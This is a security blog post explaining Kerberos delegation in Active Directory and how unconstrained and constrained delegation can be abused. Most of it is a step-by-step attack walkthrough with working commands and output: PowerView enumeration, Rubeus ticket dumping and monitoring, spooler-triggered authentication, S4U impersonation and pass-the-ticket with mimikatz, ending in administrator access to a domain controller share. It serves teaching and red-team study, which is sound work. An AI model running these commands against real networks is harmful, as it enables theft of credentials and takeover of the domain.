---
cover: https://i.postimg.cc/fW9FQ5D7/Designer.jpg
title: "A Deep Dive into Kerberos - Part 2: Exploiting Design Flaws in Delegation Mechanisms"
date: 8/25/2024 3:32:40 +06:00
categories: research
tags: [Unconstrained Delegation, Constrained Delegation, Alternate Service Name, S4U2Self, RBCD]
toc: true
toc_number: false
---

# Unconstrained Delegation
![Unconstrained Delegation](https://i.postimg.cc/h4XfzHtT/Unconstrained-drawio.png)

When a user wants to access a service eg: **HTTP** the client will ask for **Service Ticket** for HTTP service from the Ticket Granting Server by providing their TGT and SPN `HTTP\dev.dhitalcorp.local`, the Ticket Granting Server will verify the TGT provide them **ST** for that service, the client will then present the ST to the web server which will grant or deny them access. But in a dynamic web application the web application will have to  only display the information and functionalities this user is supposed to access as opposed to an administrator user right? Due to this issue Microsoft introduced unconstrained delegation. When the user sends **ST** to the web server computer, the web server computer will extract the user's **TGT** from the Service Ticket and cache it in its memory then it will send the user's TGT to the domain controller on behalf of this user to request service ticket for database server. After receiving the **ST** for database server it will connect to the database server on behalf of this user and complete the user impersonation to display only the information and functionalities which the client has access to or perform action on the web application as that user. 

**Note:** If unconstrained delegation is setup on a machine it will impersonate the user and delegate that user's credential to any service without any limitation.

# Problem with this Architecture
The main problem with unconstrained delegation is that any user who accesses the web application, the web server computer will cache their TGT in its memory. So if we have administrator access on web server computer we can extract TGT of every user who accessed the web application. Another interesting aspect to unconstrained delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user from that computer. So, if an admin or user accesses a file share or any other service from that machine, their TGT will be cached.

# Exploiting Unconstrained Delegation
First we need to identify computers setup for Unconstrained Delegation on the domain. We can use PowerView or ADSearch.exe if you're using cobaltstrike.
```powershell
PS C:\Users\Alex> Get-DomainComputer -UnConstrained

Name               : APP01$
DistinguishedName  : CN=APP01,OU=Application Servers,DC=dev,DC=dhitalcorp,DC=local
OperatingSystem    : Windows Server 2016 Standard
Unconstrained      : True
```
After compromising `APP01$` computer we can use Rubeus or mimikatz for exporting the user's TGT who connected to this computer. Below we are using Rubeus.
```powershell
C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
-------------------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                  | Service                                       | EndTime                  |
 ------------------------------------------------------------------------------------------------------------------| 
 | 0x41a4c3 | administrator @ DEV.DHITALCORP.LOCAL | krbtgt/DEV.DHITALCORP.LOCAL        |   3/7/2024 3:52:17 PM    |
 ------------------------------------------------------------------------------------------------------------------| 
 | 0x35b5d2 | jdoe @ DEV.DHITALCORP.LOCAL | krbtgt/DEV.DHITALCORP.LOCAL                 |   3/7/2024 4:12:45 PM    |
 ------------------------------------------------------------------------------------------------------------------| 
```
We can see jdoe's TGT is cached. We can simply extract his TGT and leverage it using pass the ticket attack.

```powershell
C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x35b5d2 /nowrap

woIGwkMuSU92GH23KL....==
```
# Exploiting Unconstrained delegation via forced authentication
Recently discovered a feature of MS-RPRN which allows any authenticated domain user can force any machine running spooler service to connect to a second machine of the user's choice. We can obtain TGT for machine accounts by forcing them to authenticate to this machine. If unconstrained delegation exists in a machine we can also leverage this to force domain controller to authenticate to this machine to get the TGT of machine account which we can everage via `S4U2Self` abuse. Below we are using Rubeus on app01 to continuously monitor for TGTs.

```powershell
C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
```
On any compromised machine we can use SharpSpoolTrigger to force dc.dev.dhitalcorp.local to authenticate to APP01.dev.dhitalcorp.local

```powershell
C:\Users\Alex> C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc.dev.dhitalcorp.local app01.dev.dhitalcorp.local
```
As shown below rubeus will grab the TGT of DC$ machine account.
```powershell
[*] 3/7/2024 4:12:45 PM UTC - Found new TGT:

  User                  :  DC$@DEV.DHITALCORP.LOCAL
  StartTime             :  3/7/2024 4:00:00 PM
  EndTime               :  3/7/2024 10:00:00 PM
  RenewTill             :  3/14/2024 4:00:00 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

wrJFljlELklQR2FG4EJ7KH7GB8erty....==

```
Now in order to exploit this we need to understand what `S4U2Self` and `S4U2Proxy` is.

- S4U2Self: Allows a service to request service ticket of itself on behalf of any user.
- S4U2Proxy: Allows a service to request service ticket of another service on behalf of any user.

Here, since we have TGT of domain controller abusing `S4U2Self` we can request service ticket of itself(domain controller) on behalf of any user meaning we can simply request service ticket for cifs service on domain controller for domain administrator. Suppose `alex` is the domain administrator.

```powershell
C:\Users\Alex> C:\Rubeus.exe s4u /impersonateuser:alex /self /altservice:cifs/dc.dev.dhitalcorp.local /user:dc$ /ticket:wrJFljlELklQR2FG4EJ7KH7GB8erty...== /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'DC$@dev.dhitalcorp.local'
[*] Using domain controller: dc.dev.dhitalcorp.local (10.10.63.110)
[*] Sending S4U2self request to 10.10.63.110:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/dc.dev.dhitalcorp.local'
[*] Got a TGS for 'alex' to 'cifs@DEV.DHITALCORP.LOCAL'
[*] base64(ticket.kirbi):

ejKSyDWh6fgMuaW9ERb6jl89...=
```
Using this service ticket we can perform pass the ticket attack.

```powershell
C:\Users\Alex> Rubeus.exe ptt /tikcet:<base-64ticket>
```
We can now list shares on dc$ or psexec to gain system access.

```powershell
C:\Users\Alex> ls \\dc.dev.dhitalcorp.local\c$
```
Alternatively instead of cifs we could also request for service ticket for ldap and perform dcsync or request service ticket for HTTP for powershell remoting.

# Constrained Delegation
![Constrained Delegation](https://i.postimg.cc/8Cdhjccb/constrained.jpg)

Due to problem in unconstrained delegation and emerging attaks microsoft released constrained delegation instead of a server configured to delegate a user's credentials to any services, in constrained delegation a server is allowed to delegate the user's credential only to a specific server. eg the web server is only allowed to delegate the user's credential to database server. Here the server configured with constrained delegation does not cache a user's TGT in its memory. The server instead uses its own TGT to request for service ticket on behalf of a user.

## Working
- First the client will authenticate to a web application using form based authentication.
-  The web server computer will request **S4U2Self Ticket** for itself on behalf of the client from the KDC.
-  The web server computer will again send this **S4U2Self Ticket** to the KDC and request **S4U2Proxy Ticket** for CIFS service on behalf of the client.
-  The KDC will check the web server computer's `msDS-AllowedToDelegateTo` property and if CIFS service is listed, it will send **S4U2Proxy Ticket** for CIFS service on behalf of the client.
-  The web server computer will then use this **S4U2Proxy Ticket** to access CIFS server on behalf of the client.

## Problem with this architecture
Since its sole responsibility of server configured with constrained delegation to request service ticket for configured service eg: cifs on behalf of a user, but the server doesnot check for which user. Meaning if we compromise a server with constrained delegation we can request S4U2Self and S4U2Proxy ticket for the configured service on behalf of any user. We can access the cifs service as domain administrator as well.

**Note:** Constrained delegation can be setup on both computer and service accounts.

## Exploiting Constrained Delegation
First find servers confgured with constrained delegation. We can use PowerView or ADSearch.exe in case of cobaltstrike. Below we are using PowerView.

```powershell
C:\Users\Alex> Get-DomainComputer -TrustedToAuth
```
```powershell
C:\Users\Alex> Get-DomainUser -TrustedToAuth

distinguishedname : CN=SQL-1,OU=Servers,DC=dev,DC=dhitalcorp,DC=local
name              : SQL-1
samaccountname    : SQL-1$
operatingsystem   : Windows Server 2019 Datacenter
allowedtodelegate : {cifs/dc.dev.dhitalcorp.local}
```
We can see above SQL-1$ computer is allowed to delegate cifs service on dc.dev.dhitalcorp.local that means we can access cifs service on dc.dev.dhitalcorp.local as any user. First we will need to dump TGT of SQL-1$ computer account using this we can perform s4u2self and 4u2proxy for cifs on dev.dhitalcorp.local using a single command.

```powershell
C:\Users\Alex> .\Rubeus.exe triage
```
```powershell
C:\Users\Alex> .\Rubeus.exe dump /luid:0x2e5 /service:krbtgt /nowrap
```
```powershell
C:\Users\Alex> .\Rubeus.exe s4u /impersonateuser:alex /msdsspn:cifs/dc.dev.dhitalcorp.local /user:sql-1$ /ticket:erPFKSBNer4HGMuSU8= /nowrap
```
Now, save the `S4U2Proxy` ticket to a file and pass the ticket using rubeus or mimikatz

```powershell
C:\Users\Alex> echo <base64ServiceTicket> > C:\Users\Alex\Desktop\ticket.kirbi
C:\Tools\Mimikatz\mimikatz.exe
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt C:\Users\Alex\Desktop\ticket.kirbi
```
Pass the ticket using Rubeus
```powershell
C:\Users\Alex> .\Rubeus.exe ptt /ticket:C:\Users\Alex\Desktop\ticket.kirbi
```
Access cifs on dev.dhitalcorp.local
```powershell
C:\Users\Alex> net use \\dc.dev.dhitalcorp.local\c$
```
